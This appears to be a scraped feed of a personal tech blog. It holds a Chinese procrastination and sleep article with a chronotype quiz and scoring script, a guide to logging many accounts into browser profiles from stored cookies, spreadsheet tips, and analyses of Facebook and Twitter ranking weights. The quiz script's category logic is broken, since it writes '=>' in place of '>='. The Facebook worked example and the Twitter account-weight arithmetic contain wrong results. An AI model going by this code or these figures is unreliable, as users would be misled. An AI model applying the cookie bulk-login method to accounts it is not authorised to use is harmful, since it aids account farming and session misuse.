睡眠法建议你优化睡眠环境，确保安静、舒适、黑暗，并遵循一定的睡前准备和放松技巧。此外，规律的作息时间和避免刺激性物质的摄入也对睡眠质量有积极影响。 如果晚上没有获得充足的睡眠，可控修复期可以帮助你在白天进行短暂的休息来恢复精力。这可以是一个短暂的午休时间，或者安排一些放松活动和休息片刻来恢复体力和注意力。 通过合理调整睡眠和休息节律，你可以更好地适应自己的生物钟和睡眠类型。这样，你就能在工作中达到最佳状态，提高工作效率。记住，合理的休息和良好的睡眠是拖延症的解决之道，为你的身心健康和工作表现提供支持。 调整休息节奏 R90 睡眠法 R90 睡眠法是一种高效的睡眠方式，通过保持完整的睡眠周期来提升睡眠质量和工作效率。每个人的睡眠需求和入睡时间可能不同，但高质量的睡眠需要以 90 分钟为一个周期。成年人通常需要每天睡 4-5 个周期，即 6-7.5 小时。睡眠周期包括入睡期、浅睡期、熟睡期、深睡期和快速眼动期，完成这 5 个阶段共需 90 分钟。关键在于保证这 5 个睡眠阶段不被打断，而不是睡眠时间的长短。如果睡眠周期完整，偶尔的失眠也无需焦虑。根据固定的起床时间，逆推入睡时间，建立规律的睡眠节奏。 善用「可控修复期」 白天的「可控修复期」是为了补充能量和调整精力的时段。除了晚上的睡眠需求外，白天还有两个时间段最适合进行修复。一个是午后 1 点到 3 点，另一个是傍晚 5 点到 7 点。根据个人情况，可以小睡 30 分钟或完整睡眠一个周期（90 分钟）。即使无法入睡，闭上眼睛放松也会有调节效果。避免长期依赖咖啡或能量饮料提神，而是利用规律的自然修复来恢复精力，保持良好的昼夜节律。 尝试完成下面的睡眠类型测试题，看看你属于哪种睡眠类型。在评估过程中，应该依据非工作日的自然醒来判断睡眠时间，而非根据工作日的闹钟设定。这样可以更准确地估计你所需要的睡眠时长。 时间型自测量表 请在每道题目中选择与自己情况最相符的一个选项 序号 题目 得分 1 如果你能够完全自由地计划白天的时间，你希望大约在什么时间起床？ 早上 5 点至 6 点半（05:00-06:30h） 早上 6 点半至 7 点 45 分（06:30-07:45h） 早上 7 点 45 分 9 点 45 分（07:45-09:45h） 早上 9 点 45 分至 11 点（09:45-11:00h） 早上 11 点至正年 12 点（11:00-12:00h） 2 如果你能够完全自由地计划夜晚的时间，你希望大约在什么时间去睡觉？ 晚上 8 点至 9 点（20:00-21:00h） 晚上 9 点至 10 点 15 分 （21:00-22:15h） 晚上 10 点 15 分至 12 点半（22:15-00:30h） 凌展 12 点半至 1 点 45 分（00:30-01:45h） 凌晨 1 点 45 分至 3 点（01:45-03:00h) 3 如果你要在早上的某个时刻起床，你会有多么依赖闹钟来唤醒你？ 完全不依赖 略为依赖 比较依赖 非常依赖 4 在早上时，你有多容易起床？(当你没有被突如其来的事唤醒） 非常困难 比较困难 一般容易 非常容易 5 早上起床后的半小时内，你有多精神？ 完全不精神 一点精神 一般精神 非常精神 6 在起床后的半小时内，你感到有多饿？ 完全不饿 有一点饿 一般饿 非常饿 7 清晨起床后的半小时内，你的感觉如何？ 非常疲倦 稍为疲倦 一般清醒 非常清醒 8 如果在第二天你没有任何约会，相比你平时习惯的时间，你会选择什么时间去睡觉？ 较平常推迟很少或从不推迟 较平常推迟不到一小时 较平常推迟 1-2 小时 较平常推迟两小时以上 9 假设你决定要开始做运动，你的朋友建议你应一周进行两次一小时的运动，而且在早上 7-8 点(07-08h）为最佳时间。请谨记你只需考虑自己的生理时钟，你认为你会表现得怎么样？ 很好的表现 一般好地表现 难以执行 非常难执行 10 在夜晚你大约到什么时候你会感到疲倦，而且需要睡觉？ 晚上 8 点至 9 点（20:00-21:00h） 晚上 9 点至 10 点 15 分（21:00-22:15h） 晚上 10 点 15 分至 12 点 45 分（22:15-00:45h） 凌晨 12 点 45 分至 2 点（00:45-02:00h） 凌晨 2 点至 3 点（02:00-03:00h） 11 假设你希望在一项会令你精神疲累而且持续续两个小时的测试中取得最佳表现时，如果你能完全自由地计划你的时间，仅需考虑你自己的生理时钟，你会选择以下哪段考试时间？ 早上 8 点至 10 点（08:00-10:00h） 早上 11 点至下午 1 点（11:00-13:00h） 下午 3 点至下午 5 点（15:00-17:00h） 晚上 7 点至 9 点（19:00-21:00h） 12 如果你要在晚上 11 点（23:00h）去睡觉，你会有多疲倦？ 完全不疲倦 小小疲倦 一般疲倦 非常疲倦 13 假设因为某些原因，你比平时迟几个小时去睡觉，但又不需在第二天早上的特定时间起床，你最可能出现以下哪种情況？ 按平常的时间起床，而且不会再睡 按平常的时间起床，但感到昏昏欲睡 按平常的时间起床，然后再睡 无法按平常的时间起床 14 假设因为你要值夜班，而你要在清晨 4-6 点（04:00-06:00h）时候需要保特清醒，而第二天你设有任何约会。以下哪种情况最适合你？ 夜班结束后才去睡觉 值夜班前片刻小睡，面结束后再睡觉 夜班前睡一觉，结束后再打个盹儿 只在值夜班前睡一觉 15 假设你需要进行一项两小时的艰巨体力工作，你可以完全自由地计划时间，仅需考虑你自己的生理时钟，你会选择以下哪个时段？ 上午 8 点 - 10 点（08:00-10:00h） 上年 11 点 - 下午 1 点（11:00-13:00h） 下午 3 点 - 5 点（15:00-17:00h） 夜晚 7 点 - 9 点（19:00-21:00h） 16 假设你决定要开始做运动，你的朋友建议你应一周进行两次一小时的运动，面且在晚上 10-11 点（22:00-23:00h）为最佳时间。请紧记你只需考虑自己的生理时钟，你认为你会有怎么样的表现？ 很好的表现 一般的表现 难以执行 非常难以执行 17 假设你可以选择自己的工作时间，你每天只常工作 5 个小时（包括休息时间），而这项工作是很有趣的，酬金会依据你的工作表现，你会选择以下哪个时段呢？ 五个小时，由早上 4 点至 8 点期间开始 五个小时，由早上 8 点至 9 点期间开始 五个小时，由早上 9 点至下午 2 点期间开始 五个小时，由下午 2 点至 5 点期间开始 五个小时，由下午 5 点至凌晨 4 点期间开始 18 一天之中以下哪个时段你的状态最好？ 早上 5 点至 8 点 （05:00-08:00h） 早上 8 点至 10 点（08:00-10:00h） 早上 10 点至下午 5 点（10:00-17:00h） 下午 5 点至 10 点（17:00-22:00h） 晚上 10 点至凌晨 5 点（22:00-05:00h） 19 人可分为“清晨”型和“夜晚”型，你认为你自己属于哪一种类型？ 绝对“清晨”型 “清晨”型多过“夜晚”型 “夜晚”型多过“清晨”型 绝对“夜晚”型 类型 分数 const procrasTest = document.getElementsByClassName('procrasTest') const procrasResult = document.getElementsByClassName('procrasResult') document.getElementById('procrasTest').addEventListener('click', () => { const x = [...procrasTest].map(i => i.value) procrasResult[0].innerText = ~~x[0] + ~~x[3] + ~~x[6] + ~~x[9] + ~~x[12] + ~~x[15] + ~~x[18] + ~~x[21] procrasResult[1].innerText = ~~x[1] + ~~x[4] + ~~x[7] + ~~x[10] + ~~x[13] + ~~x[16] + ~~x[19] + ~~x[22] procrasResult[2].innerText = ~~x[2] + ~~x[5] + ~~x[8] + ~~x[11] + ~~x[14] + ~~x[17] + ~~x[20] + ~~x[23] }) const ZTPITest = document.getElementsByClassName('ZTPITest') const ZTPIResult = document.getElementsByClassName('ZTPIResult') document.getElementById('ZTPITest').addEventListener('click', () => { const x = [...ZTPITest].map(i => i.value) // 过去消极时间观 ZTPIResult[0].innerText = ((~~x[3] + ~~x[4] + ~~x[15] + ~~x[21] + ~~x[26] + ~~x[32] + ~~x[33] + ~~x[35] + ~~x[49] + ~~x[53]) / 10).toFixed(2) // 当下享乐主义时间观 ZTPIResult[1].innerText = ((~~x[0] + ~~x[7] + ~~x[11] + ~~x[16] + ~~x[18] + ~~x[22] + ~~x[25] + ~~x[27] + ~~x[30] + ~~x[31] + ~~x[41] + ~~x[43] + ~~x[45] + ~~x[47] + ~~x[54]) / 15).toFixed(2) // 未来时间观 ZTPIResult[2].innerText = ((~~x[5] + (6 - x[8]) + ~~x[9] + ~~x[12] + ~~x[17] + ~~x[20] + (6 - x[23]) + ~~x[29] + ~~x[39] + ~~x[42] + ~~x[44] + ~~x[50] + (6 - x[55])) / 13).toFixed(2) // 过去积极时间观 ZTPIResult[3].innerText = ((~~x[1] + ~~x[6] + ~~x[10] + ~~x[14] + ~~x[19] + (6 - x[24]) + ~~x[28] + (6 - x[40]) + ~~x[48]) / 9).toFixed(2) // 当下宿命主义时间观 ZTPIResult[4].innerText = (~~x[2] + ~~x[13] + ~~x[34] + ~~x[36] + ~~x[37] + ~~x[38] + ~~x[46] + ~~x[51] + ~~x[52]).toFixed(2) }) const MEQScore = document.getElementsByClassName('MEQScore') const MEQCategory = document.getElementById('MEQCategory') const MEQResult = document.getElementById('MEQResult') document.getElementById('MEQ').addEventListener('click', () => { const finalScore = [] for (let i = 0; i < MEQScore.length; i++) { const itemScore = document.querySelector(`.q${i + 1}:checked`).value finalScore.push(itemScore) MEQScore[i].innerText = itemScore } const score = finalScore.reduce((x, y) => x + ~~y, 0) MEQResult.innerText = score if (score >= 16 && score <= 30) { MEQCategory.innerText = '绝对“夜晚型”' } else if (score => 31 && score <= 41) { MEQCategory.innerText = '中度“夜晚型”' } else if (score => 42 && score <= 58) { MEQCategory.innerText = '“中间型”' } else if (score => 59 && score <= 69) { MEQCategory.innerText = '中度“清晨型”' } else if (score => 70 && score <= 86) { MEQCategory.innerText = '绝对“清晨型”' } }) ","tags":[{"index":-1,"name":"生活","slug":"life","used":true,"link":"https://dev-coco.github.io/tag/life/"}],"title":"摆脱拖延症，提高效率","feature":"https://dev-coco.github.io/post-images/The-Procrastination.png","link":"https://dev-coco.github.io/post/The-Procrastination/","stats":{"text":"116 min read","time":6950000,"words":33942,"minutes":116},"date":"2023-05-26 09:24:57","dateFormat":"2023-05-26"},{"content":"使用 Cookies 在多个浏览器人员批量登陆账号。 插件下载：Chrome 插件合集 使用方法 Google Excel 模板：模板 在表格 A 列放入需要登陆的域名，不带 https 前缀，B 列放入对应的 Cookies，C 列留空。 然后点击「扩展程序」，选择「Apps 脚本」。 点击「部署」，选择「新建部署」。 选择「Web 应用」，然后按照步骤部署，部署成功后会有一个脚本链接。 解压插件包，使用文本打开「background.js」文件，在第六行的引号里放入刚才部署好的脚本链接。 const scriptUrl = '' 将插件安装到浏览器，并且把浏览器的插件配置复制到其它浏览器人员，当重新启动浏览器人员的时候就会使用 Cookies 登陆账号。注意：还没使用 Cookies 登陆过账号的浏览器启动的间隔时间不要太短，否则可能会出现问题。 会先通过脚本链接从表格里面随机取一个未登陆过的 Cookies，然后在浏览器登陆，登陆完成后在表格对应的 C 列标记 Login。 ","tags":[{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"}],"title":"批量登陆账号","feature":"https://dev-coco.github.io/post-images/Cookies-Login-Account.png","link":"https://dev-coco.github.io/post/Cookies-Login-Account/","stats":{"text":"2 min read","time":61000,"words":289,"minutes":2},"date":"2023-05-04 22:44:34","dateFormat":"2023-05-04"},{"content":"减少文件在 Google Excel 占用的内存。 优化思路 使用外部链接代替本地文件。 实例 在表格中使用「在单元格内插入图片」和「在单元格上方插入图片」都会占用表格的内存，如果图片的尺寸越大，就会占用越大的内存。 如果插入的图片多了，表格就会变得非常大，不过储存空间最多只能显示 500MB 但其实可能会占用更多的空间，只是不会被显示出来而已。 使用 Gyazo 截图，把链接粘贴在单元格内，再使用 IMAGE 函数获取图片。 这样做的好处是使用第三方服务来托管图片，不会占用表格的空间。 为你推荐：Google Excel 性能优化教程目录 ","tags":[{"name":"Excel","slug":"excel","used":true,"link":"https://dev-coco.github.io/tag/excel/"}],"title":"Google Excel 性能优化 - 减少内存","feature":"https://dev-coco.github.io/post-images/Google-Excel-Boost-Reduce-Storage.jpg","link":"https://dev-coco.github.io/post/Google-Excel-Boost-Reduce-Storage/","stats":{"text":"1 min read","time":42000,"words":205,"minutes":1},"date":"2023-04-30 00:24:32","dateFormat":"2023-04-30"},{"content":"将 Google Excel 性能优化相关的文章整理成目录方便查找。 目录 序号 目录 1 IF 管理函数执行 2 IF 跳过无效内容 3 引用范围 4 减少单元格 5 跨表引用 6 创建辅助表 7 数据压缩 8 跨表计数 9 数组输出 10 下拉菜单性能对比 11 数据匹配性能对比 12 减少内存 13 多人编辑表格出现错误 相关推荐：Google 脚本基础教程目录 ","tags":[{"name":"Excel","slug":"excel","used":true,"link":"https://dev-coco.github.io/tag/excel/"}],"title":"Google Excel 性能优化教程目录","feature":"https://dev-coco.github.io/post-images/Google-Excel-Boost-Tutorial.jpg","link":"https://dev-coco.github.io/post/Google-Excel-Boost-Tutorial/","stats":{"text":"1 min read","time":28000,"words":127,"minutes":1},"date":"2023-04-29 22:20:57","dateFormat":"2023-04-29"},{"content":"Provide a detailed introduction to the latest Facebook algorithm and its weight calculation method. .form{width:300px;margin-bottom:20px;background-color:#fff;border:1px solid transparent;border-radius:16px 16px 5px 5px;box-shadow:0 1px 1px rgba(0,0,0,.05);border-color:#428bca;margin:10px auto}.panel-heading{color:#fff;background-color:#428bca;border-color:#428bca;text-align:center;padding:15px;border-bottom:1px solid transparent;border-top-right-radius:13px;border-top-left-radius:13px}lable{width:100px;font-size:16px;padding-top:7px;float:left;text-align:right}.form-control{font-size:16px;margin-top:10px;margin-bottom:10px}.btn,input,select{margin-left:10px;padding:5px;font-size:16px;width:150px;box-sizing:border-box}.btn{margin:0 auto}#postScore,#recationScore{text-align:center;margin:5px}.icon{width:20px;margin:0 5px!important;vertical-align:middle;display:inline!important} I will be discussing the algorithm used by Facebook and how weights are calculated for different features. If you wish to repost this content, please provide proper attribution and include a link to this article. Factors that influence ranking Affinity Score The Affinity Score refers to the degree of closeness between a user and content. It is based on the user's interaction history with a post, such as whether they frequently engage with the account or the type of content. The higher the Affinity Score between a user and a post, the higher the post's weight score. Weight Value Weight value refers to the user's interaction with a post, including likes, comments, shares, and so on. It is used to measure the weight of a user's interaction with a particular post. Different types of interactions carry different weights when calculating weight scores. Below are the weight scores for different types of interactions. Category Weight score Like&nbsp;&nbsp;&nbsp; 1 Love&nbsp;&nbsp;&nbsp; 2 Wow&nbsp;&nbsp;&nbsp;&nbsp; 3 Hah&nbsp;&nbsp;&nbsp;&nbsp; 4 Sorry&nbsp;&nbsp; 7 Anger&nbsp;&nbsp; 8 Support 16 Comment 13 Share 26 Popular 400 Weighted Score Algorithm f1(w1) = P1 x wP1 + P2 x wP2 + P3 x wP3 + P4 x wP4 + P7 x wP7 + C x wC + S x wS P1-P7 represent the number of likes for different types of likes. wP1-wP7 represent the weight scores for different types of likes. C represents the number of comments. wC represents the weight score for comments. S represents the number of shares. wS represents the weight score for shares. For example, if a post has 19 likes, 8 loves, 3 hugs, 44 comments, and 2 shares, then the weighted score is calculated as 19 * wP1 + 8 * wP2 + 3 * wP3 + 44 * wC + 2 * wS = total score, which in this case is 707. If the total score is greater than 400, then the post is considered to be popular. Post Weight Calculator Like Love Wow Hah sorry anger support comment share Calculate Time Decay Refers to the time of posting a message. As time goes on, the weight score of the message will gradually decrease to reflect its freshness and relevance. Time Decay Algorithm decayFactor = 0.5 ^ (age / halfLife) &quot;Age&quot; represents the time interval between the post's publication and the present, &quot;halfLife&quot; represents the set half-life, which is 12 hours in duration and measured in milliseconds. &quot;DecayFactor&quot; represents the decay factor calculated based on time decay, with a value between 0 and 1. Post Weight Decay Calculator Post date Calculate Homepage Ranking The total weight score is calculated as the sum of intimacy score and interaction score, multiplied by time decay. The algorithm will put the posts into the &quot;warehouse&quot; based on the total weight score. Every time a user refreshes the homepage, the posts with higher weight scores will be presented by selecting them from the warehouse. Post Sentiment Positive sentiment make posts more likely to be promoted, while negative sentiment decrease the likelihood of post promotion. The following tool can analyze whether the sentiment in a post are positive or negative based on its content. Post Sentiment Analyze Please Enter content function recationScore () { const like = document.getElementById('like').value const love = document.getElementById('love').value const wow = document.getElementById('wow').value const haha = document.getElementById('haha').value const sorry = document.getElementById('sorry').value const anger = document.getElementById('anger').value const support = document.getElementById('support').value const comment = document.getElementById('comment').value const share = document.getElementById('share').value const recationScore = document.getElementById('recationScore') const score = ~~like + ~~love * 2 +~~ wow * 3 + ~~haha * 4 + ~~sorry * 7 + ~~anger * 8 + ~~support * 16 + ~~comment * 13 + ~~share * 26 recationScore.innerText = (score > 400 ? 'Popular ' : '') + score } function calcPostWeight () { const postTime = document.getElementById('postTime').value const postScore = document.getElementById('postScore') const now = new Date().getTime() const halfLife = 43200000 // 12h const age = now - new Date(postTime).getTime() const timeDecayFactor = Math.pow(0.5, age / halfLife) postScore.innerText = timeDecayFactor; } const postContent = document.getElementById('postContent') const sentimentStatus = document.getElementById('sentimentStatus') postContent.addEventListener('keyup', () => { if (!postContent.value) return sentimentStatus.innerText = 'Please Enter content' const score = analyzeSentiment(postContent.value) if (score >= 1) { if (score > 3) { sentimentStatus.innerText = '👍👍 Exceptionally positive' } else { sentimentStatus.innerText = '👍 Positive' } } else if (score <= -1) { if (score < -3) { sentimentStatus.innerText = '👎👎 Exceptionally negative' } else { sentimentStatus.innerText = '👎 Negative' } } else { sentimentStatus.innerText = 'Didn\\'t detect any sentiment' } }) ","tags":[{"name":"Facebook","slug":"facebook","used":true,"link":"https://dev-coco.github.io/tag/facebook/"}],"title":"Facebook Algorithm 2023 Update","feature":"https://dev-coco.github.io/post-images/Facebook-Algorithm-EN.png","link":"https://dev-coco.github.io/post/Facebook-Algorithm-EN/","stats":{"text":"6 min read","time":322000,"words":859,"minutes":6},"date":"2023-04-27 00:36:17","dateFormat":"2023-04-27"},{"content":"Provide a detailed explanation of Twitter's algorithm and its delivery mechanism. .form{width:300px;margin-bottom:20px;background-color:#fff;border:1px solid transparent;border-radius:16px 16px 5px 5px;box-shadow:0 1px 1px rgba(0,0,0,.05);border-color:#428bca;margin:10px auto}.panel-heading{color:#fff;background-color:#428bca;border-color:#428bca;text-align:center;padding:15px;border-bottom:1px solid transparent;border-top-right-radius:13px;border-top-left-radius:13px}lable{width:100px;font-size:16px;padding-top:7px;float:left;text-align:right}.form-control{font-size:16px;margin-top:10px;margin-bottom:10px}.btn,input,select{margin-left:10px;padding:5px;font-size:16px;width:150px;box-sizing:border-box}.btn{margin:0 auto}#accountScore,#postScore{text-align:center;margin:5px} I will provide a detailed explanation of my personal understanding of the Twitter algorithm code and include sources. However, different engineers may draw different conclusions from their analysis, and the Twitter algorithm may change at any time. Therefore, please approach the content of this article with a rational perspective and use it for reference only. If you intend to republish this article, please provide proper attribution and include a link to the original source. Twitter Tweet Weight Algorithm Twitter's algorithm model includes a machine learning model called &quot;Heavy Ranker,&quot; which retrieves and ranks the weight scores of tweets for the &quot;For You&quot; section on the homepage. Below are the summarized weight values and upper limits for each type. Different functions have different upper limit values, and even if the quantity of a certain function is large, the gain will not be infinitely stacked. category score limit Like +0.5 points 100 points The user has liked the tweet. Retweeted +1.0 points 100 points The user has retweeted the tweet. Reply +13.5 points 100 points User's reply to a tweet. Access personal profile page. +12 points 1000000 points Follow a tweet to the author's page and show your support by liking or replying to their content. The video is being played. +0.005 points 100 points For tweets that contain videos, viewers are required to watch at least 50% of the content. Author's response +75 points 200 points The author of the tweet responded to a user's reply to the tweet. Reply to a reply +11 points 1000000 points Users can like or reply to replies to a tweet. View 2 minutes +10 points 1000000 points Users spend no less than 2 minutes view tweets. Negative reaction -74 points -1000 points Users have a negative reaction to the tweet (not interested in this tweet, block the author, hide the author). Reported -369 points -20000 points The user reported a tweet. Can you please provide me with more context on the situation? Code related to scores for various types. As the code for the upper limit is too lengthy, it is not included here but can be found in the source below. scored_tweets_model_weight_fav: 0.5 scored_tweets_model_weight_retweet: 1.0 scored_tweets_model_weight_reply: 13.5 scored_tweets_model_weight_good_profile_click: 12.0 scored_tweets_model_weight_video_playback50: 0.005 scored_tweets_model_weight_reply_engaged_by_author: 75.0 scored_tweets_model_weight_good_click: 11.0 scored_tweets_model_weight_good_click_v2: 10.0 scored_tweets_model_weight_negative_feedback_v2: -74.0 scored_tweets_model_weight_report: -369.0 Algorithm for Calculating Total Score score = sum_i { (weight of engagement i) * (probability of engagement i) } Total Score = Weight * Number of Participations. For example, let's say 10 users have liked a tweet, giving it a weight of +0.5 points. With 10 participants, the engagement score would be 0.5 * 10 = 5. Thus, the total weight would be 5 points. Source of tweet algorithm and overall score algorithm: README.md Source of Upper Limit: ScoredTweetsParam.scala However, there is a widely circulated notion online that the weight of a &quot;like&quot; is 30, while that of a retweet is 20. I looked up the source code of this claim. private def getLinearRankingParams: ThriftRankingParams = { ThriftRankingParams( `type` = Some(ThriftScoringFunctionType.Linear), minScore = -1.0e100, retweetCountParams = Some(ThriftLinearFeatureRankingParams(weight = 20.0)), replyCountParams = Some(ThriftLinearFeatureRankingParams(weight = 1.0)), reputationParams = Some(ThriftLinearFeatureRankingParams(weight = 0.2)), luceneScoreParams = Some(ThriftLinearFeatureRankingParams(weight = 2.0)), textScoreParams = Some(ThriftLinearFeatureRankingParams(weight = 0.18)), urlParams = Some(ThriftLinearFeatureRankingParams(weight = 2.0)), isReplyParams = Some(ThriftLinearFeatureRankingParams(weight = 1.0)), favCountParams = Some(ThriftLinearFeatureRankingParams(weight = 30.0)), langEnglishUIBoost = 0.5, langEnglishTweetBoost = 0.2, langDefaultBoost = 0.02, unknownLanguageBoost = 0.05, offensiveBoost = 0.1, inTrustedCircleBoost = 3.0, multipleHashtagsOrTrendsBoost = 0.6, inDirectFollowBoost = 4.0, tweetHasTrendBoost = 1.1, selfTweetBoost = 2.0, tweetHasImageUrlBoost = 2.0, tweetHasVideoUrlBoost = 2.0, useUserLanguageInfo = true, ageDecayParams = Some(ThriftAgeDecayRankingParams(slope = 0.005, base = 1.0)) ) } The code did set default values for the permission to like at 30 and to retweet at 20, but it has since been removed as it was deemed unnecessary and was not being used for ranking purposes. Source： EarlybirdTensorflowBasedSimilarityEngine.scala Advertising Weight Algorithm Advertising: +10,000 weight points object AdsCandidateGenerationScoreBoostFactor extends FSBoundedParam[Double]( name = &quot;ads_candidate_generation_score_boost_factor&quot;, default = 10000.0, min = 1.0, max = 100000.0 ) Source：AdsParams.scala Twitter Blue Weighting Algorithm Subscribing to Twitter Blue provides additional weighting bonuses. category Score Twitter Blue (followed) 4x Accounts already followed. Twitter Blue (unfollowed) 2x Account that is not being followed. Code related to weight for Twitter Blue. object BlueVerifiedAuthorInNetworkMultiplierParam extends FSBoundedParam[Double]( name = &quot;home_mixer_blue_verified_author_in_network_multiplier&quot;, default = 4.0, min = 0.0, max = 100.0 ) object BlueVerifiedAuthorOutOfNetworkMultiplierParam extends FSBoundedParam[Double]( name = &quot;home_mixer_blue_verified_author_out_of_network_multiplier&quot;, default = 2.0, min = 0.0, max = 100.0 ) Sources of Weighting for Twitter Blue:HomeGlobalParams.scala Account Weight Algorithm Calculate the weight value of an account based on its status. Inactive accounts: 0 points Verified accounts: 100 points Unverified accounts: Score is calculated based on a combination of device, account information, and age, with a maximum of 55 points. In addition, the ratio of followers to following will also be factored in to determine the final weight value. Related Code object UserMass { private val currentTimestamp = Time.now.inMilliseconds private val constantDivisionFactorGt_threshFriendsToFollowersRatioUMass = 5.0 private val threshAbsNumFriendsUMass = 500 private val threshFriendsToFollowersRatioUMass = 0.6 private val deviceWeightAdditive = 0.5 private val ageWeightAdditive = 0.2 private val restrictedWeightMultiplicative = 0.1 def getUserMass(combinedUser: CombinedUser): Option[UserMassInfo] = { val user = Option(combinedUser.user) val userId = user.map(_.id).getOrElse(0L) val userExtended = Option(combinedUser.user_extended) val age = user.map(_.created_at_msec).map(DateUtil.diffDays(_, currentTimestamp)).getOrElse(0) val isRestricted = user.map(_.safety).exists(_.restricted) val isSuspended = user.map(_.safety).exists(_.suspended) val isVerified = user.map(_.safety).exists(_.verified) val hasValidDevice = user.flatMap(u =&gt; Option(u.devices)).exists(_.isSetMessaging_devices) val numFollowers = userExtended.flatMap(u =&gt; Option(u.followers)).map(_.toInt).getOrElse(0) val numFollowings = userExtended.flatMap(u =&gt; Option(u.followings)).map(_.toInt).getOrElse(0) if (userId == 0L || user.map(_.safety).exists(_.deactivated)) { None } else { val mass = if (isSuspended) 0 else if (isVerified) 100 else { var score = deviceWeightAdditive * 0.1 + (if (hasValidDevice) deviceWeightAdditive else 0) val normalizedAge = if (age &gt; 30) 1.0 else (1.0 min scala.math.log(1.0 + age / 15.0)) score *= normalizedAge if (score &lt; 0.01) score = 0.01 if (isRestricted) score *= restrictedWeightMultiplicative score = (score min 1.0) max 0 score *= 100 score } val friendsToFollowersRatio = (1.0 + numFollowings) / (1.0 + numFollowers) val adjustedMass = if (numFollowings &gt; threshAbsNumFriendsUMass &amp;&amp; friendsToFollowersRatio &gt; threshFriendsToFollowersRatioUMass) { mass / scala.math.exp( constantDivisionFactorGt_threshFriendsToFollowersRatioUMass * (friendsToFollowersRatio - threshFriendsToFollowersRatioUMass) ) } else { mass } Some(UserMassInfo(userId, adjustedMass)) } } } Here are some variable values defined: currentTimestamp: current timestamp (used to calculate the difference between account and current time). constantDivisionFactorGt_threshFriendsToFollowersRatioUMass: constant factor for the ratio of friends to followers (used to measure the proportion of a user's friends to followers). threshAbsNumFriendsUMass: minimum number of friends a user must have (used to calculate user weight). threshFriendsToFollowersRatioUMass: threshold for the ratio of friends to followers (minimum allowed value for the ratio of a user's friends to followers; exceeding this value can have negative consequences). deviceWeightAdditive: device weight. ageWeightAdditive: age weight (seems to be unused). restrictedWeightMultiplicative: weight for restricted users. When calculating the score, the account status is first checked. If the account has been deactivated, the score is 0. If the account is verified, the score is 100. If the account is not verified, the score is calculated based on certain conditions. if (isSuspended) 0 else if (isVerified) 100 else { var score = deviceWeightAdditive * 0.1 + (if (hasValidDevice) deviceWeightAdditive else 0) val normalizedAge = if (age &gt; 30) 1.0 else (1.0 min scala.math.log(1.0 + age / 15.0)) score *= normalizedAge if (score &lt; 0.01) score = 0.01 if (isRestricted) score *= restrictedWeightMultiplicative score = (score min 1.0) max 0 score *= 100 score } In this code, it first checks whether a valid device is held and then adds the initial weight. However, I couldn't find any other code that checks the validity of the device in more detail. If the device is valid, it returns 0.5 points, and if it's invalid, it returns 0 points. The default value of deviceWeightAdditive is 0.5, so according to the following algorithm, assuming the device is valid, the score would be 0.55 points (0.5 * 0.1 + 0.5). deviceWeightAdditive * 0.1 + (if (hasValidDevice) deviceWeightAdditive else 0) After calculating based on age, if the age is greater than 30 years old, return 1 point. If the age is less than or equal to 30 years old, proceed to the next calculation by dividing the age by 15, adding 1, and then taking the natural logarithm. The natural logarithm is the logarithm with base e, denoted as ln(x). Assuming the age is 22 years old, ln(1 + 22/15) ≈ 0.9028677115420144. If the natural logarithm is less than 1, return the natural logarithm. If the natural logarithm is greater than 1, return 1. This means the maximum value of normalizedAge will not exceed 1. Finally, multiply the calculated result by the previously calculated score, which is 0.55 * 0.9028677115420144 = 0.49657724134810793. val normalizedAge = if (age &gt; 30) 1.0 else (1.0 min scala.math.log(1.0 + age / 15.0)) score *= normalizedAge Some additional checks were made below. If the score is less than 0.01, it will return 0.01, but according to the above conditions, the score will not be lower than 0.01. If the account is restricted, the total score will be multiplied by the restricted weight, which is 0.1. If the score is greater than 1, it will be set to 1. If the score is less than 1, the current score will be returned. Finally, the score is multiplied by 100. Assuming the account is not restricted, based on the above conditions, the score is 49.657724134810793. if (score &lt; 0.01) score = 0.01 if (isRestricted) score *= restrictedWeightMultiplicative score = (score min 1.0) max 0 score *= 100 Next, the score will be calculated based on the account's number of following and followers. It is calculated by adding 1 to the sum of following and dividing by 1 plus the sum of followers. For example, assuming the account has 600 following and 450 followers, the ratio of following to followers would be (1 + 600) / (1 + 450) ≈ 1.3325942350332594. val friendsToFollowersRatio = (1.0 + numFollowings) / (1.0 + numFollowers) First, two conditions are evaluated: whether the number of followers is greater than the user's minimum follower count (500) and whether the ratio of followers to following is greater than the threshold (0.6). If these two conditions are not met, the previously calculated score is returned without further calculation. If both conditions are met, the difference between the ratio of followers to following and the threshold is multiplied by the constant factor of followers and fans, resulting in 5 * (1.3325942350332594 - 0.6) = 3.6629711751662968. This result is then used to calculate the exponent using the exponential function. The exponential function formula is: f(x) = a^x. Using the calculated result, we can calculate the exponential function by computing e^3.6629711751662968 ≈ 2.565617039296528. This result is the final account weight score. val adjustedMass = if (numFollowings &gt; threshAbsNumFriendsUMass &amp;&amp; friendsToFollowersRatio &gt; threshFriendsToFollowersRatioUMass) { mass / scala.math.exp( constantDivisionFactorGt_threshFriendsToFollowersRatioUMass * (friendsToFollowersRatio - threshFriendsToFollowersRatioUMass) ) } else { mass } Source：UserMass.scala Account Weight Calculator Account Status Status Suspended Verified Unverified Restricted? Select status restricted Unrestricted Birthday Followings Followers Calculate Ranking weight algorithm Category Score UI English, tweet not English 0.3x While the interface language of Twitter is in English, the tweets posted on the platform can be written in any language. Twitter English, UI not English 0.7x The tweet that was posted is written in English, however, the language used on Twitter's interface is not English. UI and language distinct. 0.1x Although the interface language of Twitter is English, the content of tweets posted on the platform can be written in languages other than English. Cannot recognize the language. 0.01x The language used in this tweet is neither user-friendly nor matches the interface language. UI English, tweet not English 0.3x The interface language of Twitter is English, but the tweets posted on it may not be in English. Images, videos, and news links 1.0x Accumulate a weights based on the number of media. External link Hide If a link is a non-media link and lacks sufficient interaction weight, it will be hidden. Downgrade Attribute No text content 1.0x There is no text in the content of the tweet. Only link 1.0x The tweet simply includes a link without any accompanying text. Only name 1.0x The tweet only has the name and no other content. As the code is too long, I have only extracted a part of it. The following code is not complete. Here are defined the initial values for each type. maxHitsPerUser has a default value of 3, which means the algorithm can push up to 3 tweets. If the account weight is greater than the value set by maxTweepcredForAntiGaming, the algorithm will push all tweets. struct ThriftRankingParams { 30: optional double langEnglishUIBoost = 0.3 31: optional double langEnglishTweetBoost = 0.7 32: optional double langDefaultBoost = 0.1 43: optional double unknownLanguageBoost = 0.01 60: optional bool enableHitDemotion = 0 61: optional double noTextHitDemotion = 1.0 62: optional double urlOnlyHitDemotion = 1.0 63: optional double nameOnlyHitDemotion = 1.0 64: optional double 